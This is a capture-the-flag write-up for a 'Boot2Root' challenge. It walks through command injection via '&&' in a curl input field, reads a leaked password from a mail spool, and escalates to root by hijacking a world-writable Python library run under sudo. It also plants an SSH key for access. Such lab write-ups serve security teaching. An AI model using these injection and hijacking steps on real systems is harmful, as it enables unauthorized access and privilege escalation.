# Boot2Root

This was a series of privilege escalation challenges. A webpage was provided which allowed a user to `curl` any webpage.

## Boot2Root - Editorial Work - Baby
A simple case of remote code execution, by passing in a `&&` into the input.

> 192.168.125.100:9002 && cat baby.txt

```
ICTF{1_r34lly_sh0uld_s4anitize_the_p4r4ms}
```

## Boot2Root - Editorial Work - User
This is more involved, since we have to escalate our permissions to another user. To solve this, we looked at `/var/spool/mail/reset`, which is a file readable by us.

```
192.168.125.100:9002 && cat /var/spool/mail/reset
```
> Dear user,
>
> I am happy to let you know that we managed to reset your password. 
>
> Please try to not forget it again, as I had to remember my own password for the administrator account, which was a pain.
>
> As a senior member of the security team here, I would suggest that you change your password immediately to something more secure. If you are having trouble remembering your password, please write it down on a piece of paper and stick it to your machine for easy access. Your password is 'imperial123' Do not forget to change it.
> 
> Best, iamrootuser

Like this, we could ssh into the server with user's credentials.
```
ICTF{c0mm4nd_3x3cut10n_15_4ll_y0u_n33d}
```

## Boot2Root - Editorial Work - Root
To escalate to root, we ran `sudo -l` to look at which commands we could run as root.
```bash
$ sudo -l
User user may run the following commands on d2be86246ce6:
    (root) NOPASSWD: /usr/bin/python3.6 /home/flask-py/enumerator.py
```

By running [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), we also found that the `/usr/lib/python3.6/webbrowser.py` file is writable by anyone. A similar challenge can be found [here](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8). By editing the `webbrowser.py` file, we could hijack the libraries `enumerator.py` loads, allowing us to execute any arbitary code.

```bash
$ nano /usr/lib/python3.6/webbrowser.py
$ sudo /usr/bin/python3.6 /home/flask-py/enumerator.py
$ curl http://172.30.0.4:5090/
```

```
ICTF{m4d_l1bs_1s_much_b3tt3r_1n_python}
```

## Misc Notes

When solving this challenge, we were really stuck at the user and root level. To get to the user level, we generated a private/public keypair locally, then added it to the `~/.ssh/authorized_keys` file for the initial user, `flask-py`. We could then ssh in and run `linpeas` which is a script that highlights potential privilege escalation routes.